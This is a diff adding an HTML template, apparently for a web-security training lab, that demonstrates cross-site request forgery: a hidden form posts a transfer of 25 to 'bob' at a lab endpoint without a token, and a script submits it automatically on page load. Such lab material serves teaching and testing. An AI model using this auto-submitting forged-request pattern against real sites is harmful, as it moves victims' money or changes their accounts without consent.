@@ -1,0 +1,8 @@
+<!doctype html>
+<html lang="zh-CN"><body>
+<form id="evil-transfer" action="/labs/csrf/transfer-no-token?mode={{ mode }}" method="post">
+  <input type="hidden" name="to_user" value="bob">
+  <input type="hidden" name="amount" value="25">
+</form>
+<script>document.getElementById('evil-transfer').submit();</script>
+</body></html>
